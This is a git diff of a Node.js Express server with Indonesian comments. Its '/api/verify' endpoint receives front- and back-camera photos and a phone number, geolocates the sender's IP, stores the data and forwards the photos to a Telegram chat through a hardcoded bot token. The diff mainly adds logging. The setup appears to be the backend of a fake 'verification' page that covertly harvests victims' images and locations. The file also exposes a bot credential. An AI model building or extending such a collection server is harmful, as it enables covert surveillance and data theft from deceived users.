@@ -8,7 +8,7 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
-const CHAT_ID = '-7352381955'; // Ganti dengan chat ID tujuan
+const CHAT_ID = '-1001234567890'; // Ganti dengan chat ID tujuan
 
 // Middleware
 app.use(express.json({ limit: '20mb' }));
@@ -109,27 +109,42 @@ async function sendTelegramMessage(chatId, text) {
 
 // Verify endpoint
 app.post('/api/verify', async (req, res) => {
+  console.log('📸 Received verify request');
+  
   try {
     let image, backImage, phone;
     
+    // Handle both JSON and FormData
     if (req.is('multipart/form-data')) {
+      console.log('📦 Processing FormData');
       image = req.body.image;
       backImage = req.body.backImage || null;
       phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
     } else {
+      console.log('📦 Processing JSON');
       image = req.body.image;
       backImage = req.body.backImage || null;
       phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
     }
     
+    console.log(`📱 Phone: ${phone}`);
+    console.log(`📸 Image length: ${image ? image.length : 'null'}`);
+    console.log(`📸 Back image: ${backImage ? 'Yes' : 'No'}`);
+    
     if (!image) {
+      console.log('❌ No image received');
       return res.status(400).json({ success: false, error: 'Foto tidak ditemukan' });
     }
     
     // Get IP and location
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
+    console.log(`🌐 IP: ${ip}`);
+    
     const location = await getLocationFromIp(ip);
     const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+    
+    console.log(`📍 Location: ${location}`);
+    console.log(`🕒 Time: ${timestamp}`);
     
     // Save to database
     const db = readDatabase();
@@ -141,12 +156,15 @@ app.post('/api/verify', async (req, res) => {
       hasBackCamera: backImage ? true : false
     });
     writeDatabase(db);
+    console.log('💾 Data saved to database');
     
     // Process front image
     const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
     const buffer = Buffer.from(base64Data, 'base64');
+    console.log(`📸 Front image size: ${buffer.length} bytes`);
     
-    // Kirim foto depan dulu
+    // Send to Telegram - FRONT CAMERA
+    console.log('📤 Sending front camera to Telegram...');
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('caption', 
@@ -168,19 +186,22 @@ app.post('/api/verify', async (req, res) => {
     });
     
     const tgData = await tgResponse.json();
+    console.log('📨 Telegram response:', tgData.ok ? '✅ Success' : '❌ Failed');
     
     if (!tgData.ok) {
-      console.error('Telegram error:', tgData);
+      console.error('❌ Telegram error:', tgData);
       return res.status(500).json({ 
         success: false, 
-        error: 'Gagal kirim ke Telegram' 
+        error: 'Gagal kirim ke Telegram: ' + JSON.stringify(tgData)
       });
     }
     
-    // Jika ada foto belakang, kirim juga
+    // If back camera image exists, send it too
     if (backImage) {
+      console.log('📤 Sending back camera to Telegram...');
       const backBase64 = backImage.replace(/^data:image\/\w+;base64,/, '');
       const backBuffer = Buffer.from(backBase64, 'base64');
+      console.log(`📸 Back image size: ${backBuffer.length} bytes`);
       
       const backForm = new FormData();
       backForm.append('chat_id', CHAT_ID);
@@ -196,16 +217,20 @@ app.post('/api/verify', async (req, res) => {
         contentType: 'image/jpeg' 
       });
       
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      const backResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: backForm,
       });
+      
+      const backData = await backResponse.json();
+      console.log('📨 Back camera response:', backData.ok ? '✅ Success' : '❌ Failed');
     }
     
+    console.log('✅ Process completed successfully');
     res.json({ success: true });
     
   } catch (err) {
-    console.error('Verify error:', err);
+    console.error('❌ Verify error:', err);
     res.status(500).json({ 
       success: false, 
       error: err.message || 'Terjadi kesalahan server' 
@@ -218,4 +243,5 @@ app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📱 Bot token: ${BOT_TOKEN.substring(0, 10)}...`);
   console.log(`📊 Webhook: http://localhost:${PORT}/webhook`);
+  console.log(`✅ Server is ready to receive photos!`);
 });
